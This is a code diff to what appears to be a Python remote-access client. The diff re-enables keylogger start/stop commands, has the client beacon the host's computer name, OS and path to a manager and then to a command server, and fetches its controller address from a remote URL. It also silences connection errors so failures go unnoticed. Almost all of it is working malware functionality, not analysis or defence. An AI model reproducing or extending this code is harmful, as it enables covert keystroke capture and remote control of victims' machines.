@@ -4,7 +4,7 @@ from threading import Thread
 from pynput.keyboard import Key, Listener
 
 #---- USER SCRIPTS ----#
-#import keylogClient, findIP
+import keylogClient, findIP
 
 received = b''
 currentPath = os.getcwd()
@@ -20,6 +20,9 @@ defPort = 1337
 #If no url is defined(empty string), it will default to given ip
 url = "" #"http://galacticdiversion.x10host.com/ip"
 ip = 'localhost'
+
+serverIP = ""
+serverPort = 0
 
 quitting = False
 
@@ -103,25 +106,25 @@ def receive():
 		args = f.read()
 		f.close()
 
-	# elif checkCom('keylog'):
-	# 	if received and not keylogClient.keylogRunning:
-	# 		process = Thread(target=keylogClient.start, args=[int(received), host])
-	# 		process.daemon = True
-	# 		process.start()
-	# 		#process.join()
-	# 		args = 'Starting Keylogger'
-	# 	elif keylogClient.keylogRunning and received:
-	# 		args = 'Keylogger Already Running'
-	# 	else:
-	# 		args = 'Provide Valid Port'
+	elif checkCom('keylog'):
+		if received and not keylogClient.keylogRunning:
+			process = Thread(target=keylogClient.start, args=[int(received), host])
+			process.daemon = True
+			process.start()
+			#process.join()
+			args = 'Starting Keylogger'
+		elif keylogClient.keylogRunning and received:
+			args = 'Keylogger Already Running'
+		else:
+			args = 'Provide Valid Port'
 
 
-	# elif checkCom('killkeylog'):
-	# 	if keylogClient.keylogRunning:
-	# 		keylogClient.kill()
-	# 		args = 'Killing Keylogger'
-	# 	else:
-	# 		args = 'Keylogger Not Running'
+	elif checkCom('killkeylog'):
+		if keylogClient.keylogRunning:
+			keylogClient.kill()
+			args = 'Killing Keylogger'
+		else:
+			args = 'Keylogger Not Running'
 
 	else:
 		args = 'Command: "' + received + '" Is Not Recognised'
@@ -144,6 +147,7 @@ def send(args):
 	receive()
 
 def connect():
+	print("Attempting To Connect To Server at: " + serverIP + " - " + serverPort)
 	notConnected = True
 	while notConnected:
 		global host, port, s
@@ -152,18 +156,20 @@ def connect():
 
 		try:
 			# print('[!] Trying To Connect To %s:%s'%(host, port))
-			s.connect((host,port))
+			s.connect((serverIP, port))
 			# print('[*] Connection Established')
 			s.send((str(os.environ['COMPUTERNAME']) + ',' + platform.system() + ',' + currentPath).encode('utf8'))
 			notConnected = False
 
 		except Exception as e:
-			print('Could Not Connect: ', e)
+			pass
+			
 
 def connectToManager():
 	notConnected = True
+	print("Attempting To Connect To Manager at: " + ip + ' - ' + port)
 	while notConnected:
-		global host, port
+		global host, port, serverIP, serverPort
 		port = int(port)
 
 		mS = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -173,24 +179,23 @@ def connectToManager():
 			
 
 			mS.send((str(os.environ['COMPUTERNAME']) + ',' + platform.system() + ',' + currentPath).encode('utf8'))
-
-			port = int(mS.recv(1024).decode())
-			print("Recieved Port:", port)
+			data = mS.recv(1024).decode().split(',')
+			serverPort = int(data[0])
+			serverIP = data[1]
 			notConnected = False
 
 		except Exception as e:
-			print('Could Not Connect To Manager: ', e)
+			# print('Could Not Connect To Manager: ', e)
+			pass
 
 def reset():
 	global received, currentPath, host, url, ip, port, portUrl, defPort
 	print("Resetting")
-	#keylogClient.kill()
+	keylogClient.kill()
 	received = b''
 	currentPath = os.getcwd()
-	# host = findIP.getIP(url, ip)
-	# port = findIP.getIP(portUrl, defPort)
-	host = ip
-	port = defPort
+	host = findIP.getIP(url, ip)
+	port = findIP.getIP(portUrl, defPort)
 
 
 while not quitting:
